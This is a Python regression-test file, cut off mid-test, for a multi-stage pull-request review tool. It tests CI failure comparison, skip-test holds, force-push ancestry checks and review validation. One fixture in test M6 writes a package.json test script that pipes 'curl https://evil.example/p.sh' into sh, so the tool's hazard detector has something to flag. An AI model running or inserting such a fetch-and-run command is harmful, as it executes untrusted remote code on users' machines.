#!/usr/bin/env python3
"""Regression tests for PR #3 CodeRabbit Major findings (M1-M15)."""

from __future__ import annotations

import sys

sys.dont_write_bytecode = True

import json
import os
from pathlib import Path
import shutil
import stat
import tempfile
import unittest

_TESTS_DIR = Path(__file__).resolve().parent
if str(_TESTS_DIR) not in sys.path:
    sys.path.insert(0, str(_TESTS_DIR))
if str(_TESTS_DIR.parent / "scripts") not in sys.path:
    sys.path.insert(0, str(_TESTS_DIR.parent / "scripts"))

from _helpers import (  # noqa: E402
    build_clean_full_review,
    extract_challenge_nonce,
    git_commit_all,
    init_git_repo,
    run_git,
    run_script,
)
import _lib  # noqa: E402
import post_pending_review  # noqa: E402
import prepare_worktree  # noqa: E402
import run_checks  # noqa: E402


def _as_int(val: object) -> int:
    assert isinstance(val, int) and not isinstance(val, bool), f"Expected int, got {val!r}"
    return val


def _as_list(val: object) -> list[object]:
    assert isinstance(val, list), f"Expected list, got {val!r}"
    return val


def _as_dict(val: object) -> dict[str, object]:
    assert isinstance(val, dict), f"Expected dict, got {val!r}"
    return {str(k): v for k, v in val.items()}


class TestPr3MajorRegressions(unittest.TestCase):
    def _complete_stage3_to_5(
        self,
        *,
        prep: dict[str, object],
        env: dict[str, str],
        checked_files: list[str],
        file_rel: str,
        file_label: str,
        verdict: str = "🟢 Approve",
        alert_tag: str = "[!TIP]",
        dismissed_smells: list[dict[str, str]] | None = None,
    ) -> tuple[int, dict[str, object]]:
        sdir = Path(str(prep["session_dir"]))
        rc_sm, _, _, err_sm = run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env)
        self.assertEqual(rc_sm, 0, err_sm)

        draft_path = Path(str(prep["draft_findings_path"]))
        if dismissed_smells:
            draft_path.write_text(
                json.dumps({"findings": [], "dismissed_smells": dismissed_smells}, ensure_ascii=False),
                encoding="utf-8",
            )
        else:
            draft_path.write_text("[]\n", encoding="utf-8")

        rc_p4, _, _, err_p4 = run_script(
            "prepare_worktree.py",
            ["prepare-stage4", "--session", str(sdir), "--draft", str(draft_path)],
            env=env,
        )
        self.assertEqual(rc_p4, 0, err_p4)

        nonce = extract_challenge_nonce(Path(str(prep["adversarial_input_path"])))
        resp_path = Path(str(prep["adversarial_response_path"]))
        resp_path.write_text(
            json.dumps(
                {
                    "challenge_nonce": nonce,
                    "challenged_findings": [],
                    "missed_findings": [],
                    "checked_files": checked_files,
                    "audit_notes": "対象ファイルの変更と影響範囲を実コードで確認しました。",
                },
                ensure_ascii=False,
            ),
            encoding="utf-8",
        )
        rc_r4, _, _, err_r4 = run_script(
            "prepare_worktree.py",
            ["record-stage4", "--session", str(sdir), "--verifier-mode", "subagent", "--response-file", str(resp_path)],
            env=env,
        )
        self.assertEqual(rc_r4, 0, err_r4)

        review_path = Path(str(prep["review_output_path"]))
        review_path.write_text(
            build_clean_full_review(
                verdict=verdict,
                alert_tag=alert_tag,
                file_rel=file_rel,
                file_label=file_label,
            ),
            encoding="utf-8",
        )
        rc_val, out_val, _, _ = run_script(
            "validate_review_output.py",
            ["--session", str(sdir), "--file", str(review_path)],
            env=env,
        )
        return rc_val, out_val

    def test_m1_hidden_dir_executable_included_in_testable_code_files(self) -> None:
        self.assertTrue(prepare_worktree.is_testable_code_file(".github/scripts/release.py"))
        self.assertTrue(prepare_worktree.is_testable_code_file(".husky/pre-commit.sh"))
        self.assertFalse(prepare_worktree.is_testable_code_file(".eslintrc.cjs"))
        self.assertFalse(prepare_worktree.is_testable_code_file(".venv/lib/pkg.py"))
        self.assertFalse(prepare_worktree.is_testable_code_file(".git/hooks/pre-commit.sh"))

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo"
            init_git_repo(repo)
            (repo / "README.md").write_text("# Demo\n", encoding="utf-8")
            git_commit_all(repo, "base")

            run_git(repo, ["checkout", "-b", "pr-hidden"])
            (repo / ".github" / "scripts").mkdir(parents=True)
            (repo / ".github" / "scripts" / "release.py").write_text(
                "def release(tag: str) -> str:\n    return tag.strip()\n",
                encoding="utf-8",
            )
            git_commit_all(repo, "add release script in .github/scripts")

            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
            rc, prep, _, err = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--range", "main..pr-hidden"],
                env=env,
            )
            self.assertEqual(rc, 0, err)
            self.assertEqual(prep["testable_code_files"], [".github/scripts/release.py"])
            self.assertGreater(_as_int(prep["code_diff_lines"]), 0)

            sdir = Path(str(prep["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env)[0], 0)
            rc_ex, _, _, _ = run_script(
                "prepare_worktree.py",
                ["gate-stage1", "--session", str(sdir), "--verdict", "EXEMPT"],
                env=env,
            )
            self.assertEqual(rc_ex, 2)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env)[0], 0)

    def test_m2_equal_count_different_diagnostics_not_preexisting(self) -> None:
        base_out = "src/a.ts(3,5): error TS2322: Type 'string' is not assignable to type 'number'.\n"
        head_out = "src/b.ts(8,10): error TS2345: Argument of type 'number' is not assignable.\n"
        wd = Path("/tmp/fake-workdir")

        base_chk: dict[str, object] = {
            "status": "failed",
            "failure_count": 1,
            "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(base_out, wd),
        }
        head_diff_chk: dict[str, object] = {
            "status": "failed",
            "failure_count": 1,
            "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(head_out, wd),
        }
        origin_diff, _, _ = run_checks._classify_head_vs_base_failure(head_diff_chk, base_chk)
        self.assertEqual(origin_diff, "regression")

        head_same_chk: dict[str, object] = {
            "status": "failed",
            "failure_count": 1,
            "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(base_out, wd),
        }
        origin_same, _, _ = run_checks._classify_head_vs_base_failure(head_same_chk, base_chk)
        self.assertEqual(origin_same, "preexisting")

        # Count-only entries with no IDs and no diagnostics must retain 'failed' with unknown origin.
        origin_unknown, _, _ = run_checks._classify_head_vs_base_failure(
            {"status": "failed", "failure_count": 1},
            {"status": "failed", "failure_count": 1},
        )
        self.assertEqual(origin_unknown, "unknown")

    def test_m3_over_200_failure_ids_compared_completely_before_truncation(self) -> None:
        base_ids = [f"pytest:tests/test_many.py::test_{i:03d}" for i in range(201)]
        head_swapped = [f"pytest:tests/test_many.py::test_{i:03d}" for i in range(200)] + [
            "pytest:tests/test_many.py::test_201"
        ]
        head_fixed_one = [f"pytest:tests/test_many.py::test_{i:03d}" for i in range(1, 201)]

        base_chk: dict[str, object] = {
            "status": "failed",
            "failed_tests": base_ids[:200],
            "_full_failed_tests": base_ids,
            "failed_tests_truncated": True,
            "failure_count": 201,
            "summary_lines": [],
        }
        head_swap_chk: dict[str, object] = {
            "status": "failed",
            "failed_tests": head_swapped[:200],
            "_full_failed_tests": head_swapped,
            "failed_tests_truncated": True,
            "failure_count": 201,
            "summary_lines": [],
        }
        logs: list[str] = []
        run_checks._apply_base_comparison_result(head_swap_chk, base_chk, "test", "0123456789ab", logs)
        self.assertEqual(head_swap_chk["status"], "failed")
        self.assertEqual(head_swap_chk["failure_origin"], "regression")
        self.assertEqual(head_swap_chk["new_failed_tests"], ["pytest:tests/test_many.py::test_201"])

        # Fixing test_000 (201 -> 200) must NOT falsely flag test_200 as a new regression.
        head_fix_chk: dict[str, object] = {
            "status": "failed",
            "failed_tests": head_fixed_one[:200],
            "_full_failed_tests": head_fixed_one,
            "failure_count": 200,
            "summary_lines": [],
        }
        run_checks._apply_base_comparison_result(head_fix_chk, base_chk, "test", "0123456789ab", logs)
        self.assertEqual(head_fix_chk["status"], "failed_preexisting")
        self.assertEqual(head_fix_chk["failure_origin"], "preexisting")

        # Without _full_failed_tests, truncated signatures must stay 'failed' (unknown) instead of preexisting.
        trunc_origin, _, _ = run_checks._classify_head_vs_base_failure(
            {"status": "failed", "failed_tests": head_swapped[:200], "failed_tests_truncated": True, "failure_count": 201},
            {"status": "failed", "failed_tests": base_ids[:200], "failed_tests_truncated": True, "failure_count": 201},
        )
        self.assertEqual(trunc_origin, "unknown")

    def test_m4_non_keyword_ci_job_failure_revokes_skip_test(self) -> None:
        self.assertEqual(
            _lib.find_stage2_test_failures(
                [{"tool": "gh_pr_checks", "status": "failed", "failed_checks": ["CI / Python 3.12"]}]
            ),
            ["gh_pr_checks"],
        )
        self.assertEqual(
            _lib.find_stage2_test_failures(
                [
                    {
                        "tool": "gh_pr_checks",
                        "status": "failed",
                        "check_entries": [{"name": "Python 3.12", "workflow": "Tests", "status": "failed"}],
                    }
                ]
            ),
            ["gh_pr_checks"],
        )
        self.assertEqual(
            _lib.find_stage2_test_failures(
                [
                    {
                        "tool": "gh_pr_checks",
                        "status": "failed",
                        "check_entries": [
                            {"name": "unit-tests", "workflow": "CI", "status": "passed"},
                            {"name": "eslint", "workflow": "Lint", "status": "failed"},
                        ],
                    }
                ]
            ),
            [],
        )

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 1\n", encoding="utf-8")
            base_sha = git_commit_all(repo, "base")
            run_git(repo, ["checkout", "-b", "pr-m4"])
            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 2\n", encoding="utf-8")
            head_sha = git_commit_all(repo, "head")

            meta = root / "meta.json"
            meta.write_text(
                json.dumps(
                    {
                        "number": 401,
                        "is_fork_pr": True,
                        "base_sha": base_sha,
                        "head_sha": head_sha,
                        "checks": [{"name": "CI / Python 3.12", "workflowName": "CI", "conclusion": "FAILURE"}],
                    }
                ),
                encoding="utf-8",
            )
            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
            rc, prep, _, err = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "401", "--pr-meta", str(meta), "--skip-test"],
                env=env,
            )
            self.assertEqual(rc, 0, err)
            sdir = Path(str(prep["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env)[0],
                0,
            )
            rc_ci, out_ci, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env)
            self.assertEqual(rc_ci, 0)
            self.assertIs(out_ci.get("skip_test_revoked"), True)
            self.assertEqual(out_ci.get("required_output_mode"), "stage1_ng")
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env)[0], 2)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env)[0], 0)

    def test_m5_and_m10_inconclusive_or_pending_tests_hold_skip_test_without_revoking(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}

            # M5: timed_out local test must hold --skip-test bypass (cannot proceed to Stage 3 or Approve)
            repo_to = root / "repo_timeout"
            init_git_repo(repo_to)
            (repo_to / "src").mkdir()
            (repo_to / "tests").mkdir()
            (repo_to / "src" / "slow.mjs").write_text("export const x = 1;\n", encoding="utf-8")
            (repo_to / "tests" / "slow.test.mjs").write_text(
                "import test from 'node:test';\n"
                "test('slow', async () => { await new Promise((r) => setTimeout(r, 5000)); });\n",
                encoding="utf-8",
            )
            (repo_to / "package.json").write_text(
                json.dumps({"name": "slow-demo", "scripts": {"test": "node --test tests/slow.test.mjs"}}),
                encoding="utf-8",
            )
            git_commit_all(repo_to, "base")
            run_git(repo_to, ["checkout", "-b", "pr-to"])
            (repo_to / "src" / "slow.mjs").write_text("export const x = 2;\n", encoding="utf-8")
            git_commit_all(repo_to, "edit")

            rc_t, prep_t, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo_to), "--range", "main..pr-to", "--skip-test"],
                env=env,
            )
            self.assertEqual(rc_t, 0)
            sdir_t = Path(str(prep_t["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir_t)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir_t), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env)[0],
                0,
            )
            rc_ci_t, out_ci_t, _, _ = run_script("run_checks.py", ["--session", str(sdir_t), "--timeout", "1"], env=env)
            self.assertEqual(rc_ci_t, 0)
            self.assertEqual(out_ci_t["overall_status"], "timed_out")
            self.assertNotIn("skip_test_revoked", out_ci_t)
            self.assertIs(out_ci_t.get("skip_test_on_hold"), True)
            self.assertEqual(out_ci_t.get("skip_test_hold_status"), "unverified")

            rc_sm_t, out_sm_t, _, _ = run_script("scan_diff_smells.py", ["--session", str(sdir_t)], env=env)
            self.assertEqual(rc_sm_t, 2)
            self.assertIs(out_sm_t.get("skip_test_on_hold"), True)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir_t)], env=env)[0], 0)

            # M10: fork PR with IN_PROGRESS test holds bypass without revoking, and recovers once checks pass
            repo_fk = root / "repo_fork"
            init_git_repo(repo_fk)
            (repo_fk / "src").mkdir()
            (repo_fk / "src" / "calc.mjs").write_text("export const v = 1;\n", encoding="utf-8")
            base_sha = git_commit_all(repo_fk, "base")
            run_git(repo_fk, ["checkout", "-b", "pr-fk"])
            (repo_fk / "src" / "calc.mjs").write_text("export const v = 2;\n", encoding="utf-8")
            head_sha = git_commit_all(repo_fk, "head")

            meta_pending = root / "meta_pending.json"
            meta_pending.write_text(
                json.dumps(
                    {
                        "number": 1001,
                        "is_fork_pr": True,
                        "base_sha": base_sha,
                        "head_sha": head_sha,
                        "checks": [{"name": "unit-tests", "status": "IN_PROGRESS", "conclusion": None}],
                    }
                ),
                encoding="utf-8",
            )
            rc_fk, prep_fk, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo_fk), "--pr", "1001", "--pr-meta", str(meta_pending), "--skip-test"],
                env=env,
            )
            self.assertEqual(rc_fk, 0)
            sdir_fk = Path(str(prep_fk["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir_fk)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir_fk), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env)[0],
                0,
            )
            rc_ci_fk, out_ci_fk, _, _ = run_script("run_checks.py", ["--session", str(sdir_fk)], env=env)
            self.assertEqual(rc_ci_fk, 0)
            self.assertNotIn("skip_test_revoked", out_ci_fk)
            self.assertIs(out_ci_fk.get("skip_test_on_hold"), True)
            self.assertEqual(out_ci_fk.get("skip_test_hold_status"), "pending")

            # Stage 3 must be blocked while pending
            rc_sm_fk, out_sm_fk, _, _ = run_script("scan_diff_smells.py", ["--session", str(sdir_fk)], env=env)
            self.assertEqual(rc_sm_fk, 2)
            self.assertIs(out_sm_fk.get("skip_test_revoked"), False)
            self.assertIs(out_sm_fk.get("skip_test_on_hold"), True)

            # Stage 5 validator must reject Approve while pending (and not flip to stage1_ng)
            rev_fk = Path(str(prep_fk["review_output_path"]))
            rev_fk.write_text(
                build_clean_full_review(verdict="🟢 Approve", alert_tag="[!TIP]", file_rel="src/calc.mjs", file_label="calc.mjs"),
                encoding="utf-8",
            )
            rc_v_fk, out_v_fk, _, _ = run_script(
                "validate_review_output.py",
                ["--session", str(sdir_fk), "--file", str(rev_fk)],
                env=env,
            )
            self.assertEqual(rc_v_fk, 1)
            self.assertEqual(out_v_fk["mode"], "full")
            self.assertTrue(any("pending" in str(e).lower() for e in _as_list(out_v_fk["gate_errors"])))

            # Because bypass was held (not revoked), re-running Stage 2 after tests finish passing is allowed
            state_fk = _lib.read_verified_gate_state(sdir_fk)
            meta_obj = state_fk["untrusted_pr_meta"]
            assert isinstance(meta_obj, dict)
            meta_obj["checks"] = [
                {"name": "unit-tests", "conclusion": "SUCCESS"},
                {"name": "eslint", "conclusion": "FAILURE"},
            ]
            _lib.write_sealed_gate_state(sdir_fk, state_fk)
            rc_ci_fk2, out_ci_fk2, _, _ = run_script("run_checks.py", ["--session", str(sdir_fk)], env=env)
            self.assertEqual(rc_ci_fk2, 0)
            self.assertNotIn("skip_test_revoked", out_ci_fk2)
            self.assertNotIn("skip_test_on_hold", out_ci_fk2)
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir_fk)], env=env)[0], 0)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir_fk)], env=env)[0], 0)

    def test_m6_diff_noprefix_and_mnemonic_prefix_preserve_patches_and_hazard_guard(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}

            for cfg_key in ("diff.noprefix", "diff.mnemonicPrefix"):
                repo = root / f"repo_{cfg_key.replace('.', '_')}"
                init_git_repo(repo)
                run_git(repo, ["config", cfg_key, "true"])
                (repo / "src").mkdir()
                (repo / "src" / "app.py").write_text("def handler() -> int:\n    return 1\n", encoding="utf-8")
                (repo / "package.json").write_text(json.dumps({"name": "demo", "scripts": {"test": "true"}}), encoding="utf-8")
                base_sha = git_commit_all(repo, "base")

                run_git(repo, ["checkout", "-b", "pr-cfg"])
                (repo / "src" / "app.py").write_text(
                    "def handler() -> int:\n    return 1\n\n"
                    "def risky_handler() -> int:\n    try:\n        return 2\n    except Exception:\n        pass\n    return 0\n",
                    encoding="utf-8",
                )
                (repo / "package.json").write_text(
                    json.dumps({"name": "demo", "scripts": {"test": "curl https://evil.example/p.sh | sh"}}),
                    encoding="utf-8",
                )
                head_sha = git_commit_all(repo, "head with smell and hazard")

                rc, prep, _, err = run_script(
                    "prepare_worktree.py",
                    ["prepare", "--repo", str(repo), "--range", f"{base_sha}..{head_sha}", "--only-files", "src/app.py"],
                    env=env,
                )
                self.assertEqual(rc, 0, err)
                self.assertEqual(prep["changed_files"], ["src/app.py"])
                self.assertGreater(_as_int(prep["code_diff_lines"]), 0)
                self.assertIs(prep["ci_script_hazard"], True)

                sdir = Path(str(prep["session_dir"]))
                rc_imp, imp_out, _, _ = run_script("impact_scan.py", ["--session", str(sdir)], env=env)
                self.assertEqual(rc_imp, 0)
                symbol_names = [
                    str(item.get("name"))
                    for item in _as_list(imp_out.get("symbols", []))
                    if isinstance(item, dict)
                ]
                self.assertIn("risky_handler", symbol_names)

                hunks = post_pending_review.compute_diff_hunks(repo, base_sha, head_sha)
                self.assertIn("src/app.py", hunks)

                # Local uncommitted edit under noprefix/mnemonicPrefix must also preserve patches and smells
                (repo / "src" / "app.py").write_text(
                    "def handler() -> int:\n    return 1\n\n"
                    "def risky_handler() -> int:\n    try:\n        return 2\n    except Exception:\n        pass\n    return 0\n\n"
                    "def local_smell() -> int:\n    try:\n        return 3\n    except Exception:\n        pass\n    return 0\n",
                    encoding="utf-8",
                )
                rc_loc, prep_loc, _, err_loc = run_script(
                    "prepare_worktree.py",
                    ["prepare", "--repo", str(repo), "--local", "--only-files", "src/app.py"],
                    env=env,
                )
                self.assertEqual(rc_loc, 0, err_loc)
                self.assertGreater(_as_int(prep_loc["code_diff_lines"]), 0)
                self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_loc["session_dir"])], env=env)[0], 0)

                self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env)[0], 0)

    def test_m7_and_m8_ancestry_guards_for_force_push_and_explicit_since(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "tests").mkdir()
            (repo / "src" / "app.mjs").write_text("export const x = 1;\n", encoding="utf-8")
            (repo / "tests" / "app.test.mjs").write_text(
                "import test from 'node:test';\nimport assert from 'node:assert/strict';\ntest('ok', () => assert.equal(1, 1));\n",
                encoding="utf-8",
            )
            (repo / "package.json").write_text(
                json.dumps({"name": "ancestry", "scripts": {"test": "node --test tests/app.test.mjs"}}),
                encoding="utf-8",
            )
            m1 = git_commit_all(repo, "m1 base")

            # Sibling branch for M8
            run_git(repo, ["checkout", "-b", "other-branch"])
            (repo / "src" / "other_only.mjs").write_text("export const o = 1;\n", encoding="utf-8")
            o1 = git_commit_all(repo, "o1 other branch")

            # PR branch: c1 -> p1 -> p2
            run_git(repo, ["checkout", "-b", "pr-42", m1])
            (repo / "src" / "app.mjs").write_text("export const x = 2;\n", encoding="utf-8")
            c1 = git_commit_all(repo, "c1")
            (repo / "src" / "abandoned.mjs").write_text("export const a = 1;\n", encoding="utf-8")
            p1 = git_commit_all(repo, "p1")

            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
            meta_p1 = root / "meta_p1.json"
            meta_p1.write_text(json.dumps({"number": 42, "base_sha": m1, "head_sha": p1}), encoding="utf-8")
            rc1, prep1, _, err1 = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "42", "--pr-meta", str(meta_p1)],
                env=env,
            )
            self.assertEqual(rc1, 0, err1)
            sdir1 = Path(str(prep1["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir1)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir1), "--verdict", "OK", "--verified-tests", "tests/app.test.mjs"], env=env)[0],
                0,
            )
            self.assertEqual(run_script("run_checks.py", ["--session", str(sdir1)], env=env)[0], 0)
            rc_v1, out_v1 = self._complete_stage3_to_5(
                prep=prep1,
                env=env,
                checked_files=["src/app.mjs", "src/abandoned.mjs"],
                file_rel="src/app.mjs",
                file_label="app.mjs",
            )
            self.assertEqual(rc_v1, 0, json.dumps(out_v1, ensure_ascii=False))
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir1)], env=env)[0], 0)

            # M7a: Force-push onto sibling commit p2 with identical merge_base m1
            run_git(repo, ["reset", "--hard", m1])
            (repo / "src" / "app.mjs").write_text("export const x = 3;\n", encoding="utf-8")
            p2 = git_commit_all(repo, "p2 force-pushed")
            meta_p2 = root / "meta_p2.json"
            meta_p2.write_text(json.dumps({"number": 42, "base_sha": m1, "head_sha": p2}), encoding="utf-8")
            rc_fp, out_fp, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "42", "--pr-meta", str(meta_p2), "--rereview"],
                env=env,
            )
            self.assertEqual(rc_fp, 2)
            self.assertIn("ancestor", str(out_fp.get("error", "")).lower())

            # M7b: Rollback to parent c1 must also be rejected
            meta_rb = root / "meta_rb.json"
            meta_rb.write_text(json.dumps({"number": 42, "base_sha": m1, "head_sha": c1}), encoding="utf-8")
            rc_rb, _, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "42", "--pr-meta", str(meta_rb), "--rereview"],
                env=env,
            )
            self.assertEqual(rc_rb, 2)

            # M8: Sibling branch ref o1 rejected across --pr, --range, and --local
            for extra_args in (
                ["--pr", "42", "--pr-meta", str(meta_p2), "--since", o1],
                ["--range", f"{m1}..{p2}", "--since", o1],
                ["--local", "--since", o1],
            ):
                rc_s, out_s, _, _ = run_script(
                    "prepare_worktree.py",
                    ["prepare", "--repo", str(repo), *extra_args],
                    env=env,
                )
                self.assertEqual(rc_s, 2, f"Expected exit 2 for {extra_args}, got {rc_s}: {out_s}")

            # Descendant commit p1 cannot be used as --since for older head c1
            rc_desc, _, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "42", "--pr-meta", str(meta_rb), "--since", p1],
                env=env,
            )
            self.assertEqual(rc_desc, 2)

    def test_m9_and_m11_concurrent_stage2_revocation_never_overwritten_by_stage4_or_stage5(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "tests").mkdir()
            (repo / "src" / "calc.mjs").write_text("export function calc(x) { return x + 1; }\n", encoding="utf-8")
            (repo / "tests" / "calc.test.mjs").write_text(
                "import test from 'node:test';\n"
                "import assert from 'node:assert/strict';\n"
                "import { calc } from '../src/calc.mjs';\n"
                "test('calc', () => { assert.equal(calc(1), 2); });\n",
                encoding="utf-8",
            )
            (repo / "package.json").write_text(
                json.dumps({"name": "race-demo", "type": "module", "scripts": {"test": "node --test tests/calc.test.mjs"}}),
                encoding="utf-8",
            )
            base_sha = git_commit_all(repo, "base ok")

            run_git(repo, ["checkout", "-b", "pr-race"])
            # Break local test so --allow-exec Stage 2 revokes --skip-test
            (repo / "src" / "calc.mjs").write_text("export function calc(x) { return x + 99; }\n", encoding="utf-8")
            head_sha = git_commit_all(repo, "broken test")

            meta = root / "meta.json"
            meta.write_text(
                json.dumps(
                    {
                        "number": 901,
                        "is_fork_pr": True,
                        "base_sha": base_sha,
                        "head_sha": head_sha,
                        "checks": [{"name": "unit-tests", "conclusion": "SUCCESS"}],
                    }
                ),
                encoding="utf-8",
            )
            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
            run_checks_script = str(_TESTS_DIR.parent / "scripts" / "run_checks.py")

            # --- M9: Stage 2 revokes during run-stage4-cli execution ---
            rc_m9, prep_m9, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "901", "--pr-meta", str(meta), "--skip-test"],
                env=env,
            )
            self.assertEqual(rc_m9, 0)
            sdir_m9 = Path(str(prep_m9["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir_m9)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir_m9), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env)[0],
                0,
            )
            self.assertEqual(run_script("run_checks.py", ["--session", str(sdir_m9)], env=env)[0], 0)
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir_m9)], env=env)[0], 0)
            draft_m9 = Path(str(prep_m9["draft_findings_path"]))
            draft_m9.write_text("[]\n", encoding="utf-8")
            self.assertEqual(
                run_script("prepare_worktree.py", ["prepare-stage4", "--session", str(sdir_m9), "--draft", str(draft_m9)], env=env)[0],
                0,
            )
            nonce_m9 = extract_challenge_nonce(Path(str(prep_m9["adversarial_input_path"])))
            verifier_cli = root / "stage4_race_cli.py"
            verifier_cli.write_text(
                "#!/usr/bin/env python3\n"
                "import json, subprocess, sys\n"
                "sys.dont_write_bytecode = True\n"
                f"subprocess.run([sys.executable, '-B', {run_checks_script!r}, '--session', {str(sdir_m9)!r}, '--allow-exec'], check=True, stdout=subprocess.DEVNULL)\n"
                f"print(json.dumps({{'challenge_nonce': {nonce_m9!r}, 'challenged_findings': [], 'missed_findings': [], 'checked_files': ['src/calc.mjs'], 'audit_notes': '競合検証用のStage4応答を返却します。'}}))\n",
                encoding="utf-8",
            )
            rc_cli, out_cli, _, _ = run_script(
                "prepare_worktree.py",
                ["run-stage4-cli", "--session", str(sdir_m9), "--cmd", f"{sys.executable} -B {verifier_cli}"],
                env=env,
            )
            self.assertEqual(rc_cli, 2, f"Stage 4 CLI must reject concurrent Stage 2 revocation: {out_cli}")
            after_m9 = _lib.read_verified_gate_state(sdir_m9)
            self.assertIs(after_m9.get("skip_test_revoked"), True)
            self.assertIs(_as_dict(after_m9["stage4"])["executed"], False)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir_m9)], env=env)[0], 0)

            # --- M11: Stage 2 revokes while Stage 5 prose lint is running ---
            rc_m11, prep_m11, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "901", "--pr-meta", str(meta), "--skip-test"],
                env=env,
            )
            self.assertEqual(rc_m11, 0)
            sdir_m11 = Path(str(prep_m11["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir_m11)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir_m11), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env)[0],
                0,
            )
            self.assertEqual(run_script("run_checks.py", ["--session", str(sdir_m11)], env=env)[0], 0)
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir_m11)], env=env)[0], 0)
            draft_m11 = Path(str(prep_m11["draft_findings_path"]))
            draft_m11.write_text("[]\n", encoding="utf-8")
            self.assertEqual(
                run_script("prepare_worktree.py", ["prepare-stage4", "--session", str(sdir_m11), "--draft", str(draft_m11)], env=env)[0],
                0,
            )
            nonce_m11 = extract_challenge_nonce(Path(str(prep_m11["adversarial_input_path"])))
            resp_m11 = Path(str(prep_m11["adversarial_response_path"]))
            resp_m11.write_text(
                json.dumps(
                    {
                        "challenge_nonce": nonce_m11,
                        "challenged_findings": [],
                        "missed_findings": [],
                        "checked_files": ["src/calc.mjs"],
                        "audit_notes": "Stage 5 競合検証のために確認完了しました。",
                    },
                    ensure_ascii=False,
                ),
                encoding="utf-8",
            )
            self.assertEqual(
                run_script(
                    "prepare_worktree.py",
                    ["record-stage4", "--session", str(sdir_m11), "--verifier-mode", "subagent", "--response-file", str(resp_m11)],
                    env=env,
                )[0],
                0,
            )
            rev_m11 = Path(str(prep_m11["review_output_path"]))
            rev_m11.write_text(
